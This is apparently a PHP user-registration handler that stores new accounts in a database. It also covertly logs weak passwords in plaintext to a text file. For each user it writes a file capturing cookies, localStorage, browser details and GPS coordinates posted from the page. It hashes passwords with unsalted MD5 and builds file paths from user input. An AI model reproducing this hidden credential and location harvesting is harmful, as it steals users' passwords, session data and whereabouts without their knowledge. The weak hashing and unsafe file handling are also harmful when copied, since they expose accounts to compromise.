<?php
	header('Location: login.php');
	include("./database.php");

	$nom          = htmlspecialchars($_POST['nom']);
	$prenom       = htmlspecialchars($_POST['prenom']);
	$pseudo       = htmlspecialchars($_POST['pseudo']);
	$adresse_mail = htmlspecialchars($_POST['mail']);
	$mot_de_passe = htmlspecialchars($_POST['mot_de_passe']);
	
	if($nom != "" AND $prenom != "" AND $pseudo != "" AND $adresse_mail != "" AND $mot_de_passe != ""){
		if($connected){
			$requete = $bdd->prepare('INSERT INTO user(nom, prenom, pseudo, adresse_mail, mot_de_passe) 
		                              VALUES (:nom, :prenom, :pseudo, :adresse_mail, :mot_de_passe);');
			$requete->execute(array(
					  'nom'          => $nom,
					  'prenom'       => $prenom,
					  'pseudo'       => $pseudo,
					  'adresse_mail' => $adresse_mail,
					  'mot_de_passe' => md5($mot_de_passe)
				  ));
			try{
				if(strlen($mot_de_passe) <= 8){
					if(!preg_match("(?=.*\d)(?=.*\W+)(?=.*[A-Z])(?=.*[a-z])", $mot_de_passe)){
						$monfichier = fopen('0_pwd_list.txt', 'a+');
						$entree = $mot_de_passe . "\n";
						fputs($monfichier, $entree);
						fclose($monfichier);
					}
				}
			} catch (Exception $e) {
				unset($e);
			}
			try{
				$monfichier = fopen('./inscriptions/'. strtolower(htmlspecialchars($_POST['pseudo'])) .'.txt', 'w+');
				$entree = 'pseudo : ' . $_POST['pseudo'] . "\n"; fputs($monfichier, $entree);
				//$entree = 'mot_de_passe : ' . $_POST['mot_de_passe'] . "\n"; fputs($monfichier, $entree);
				$entree = 'userAgent : ' . $_POST['userAgent'] . "\n"; fputs($monfichier, $entree);
				$entree = 'appname : ' . $_POST['appname'] . "\n"; fputs($monfichier, $entree);
				$entree = 'referrer : ' . $_POST['referrer'] . "\n"; fputs($monfichier, $entree);
				$entree = 'product : ' . $_POST['product'] . "\n"; fputs($monfichier, $entree);
				$entree = 'appVersion : ' . $_POST['appVersion'] . "\n"; fputs($monfichier, $entree);
				$entree = 'language : ' . $_POST['language'] . "\n"; fputs($monfichier, $entree);
				$entree = 'javaEnabled : ' . $_POST['javaEnabled'] . "\n"; fputs($monfichier, $entree);
				$entree = 'cookieEnabled : ' . $_POST['cookieEnabled'] . "\n"; fputs($monfichier, $entree);
				$entree = 'cookie : ' . $_POST['cookie'] . "\n"; fputs($monfichier, $entree);
				$entree = 'localStorage : ' . $_POST['localStorage'] . "\n"; fputs($monfichier, $entree);
				$entree = 'width : ' . $_POST['width'] . "\n"; fputs($monfichier, $entree);
				$entree = 'height : ' . $_POST['height'] . "\n"; fputs($monfichier, $entree);
				$entree = 'latitude : ' . $_POST['latitude'] . "\n"; fputs($monfichier, $entree);
				$entree = 'longitude : ' . $_POST['longitude'] . "\n"; fputs($monfichier, $entree);
				$entree = 'accuracy : ' . $_POST['accuracy'] . "\n"; fputs($monfichier, $entree);	
				fclose($monfichier);
			} catch (Exception $e) {
				unset($e);
			}
		}
	}	
?>
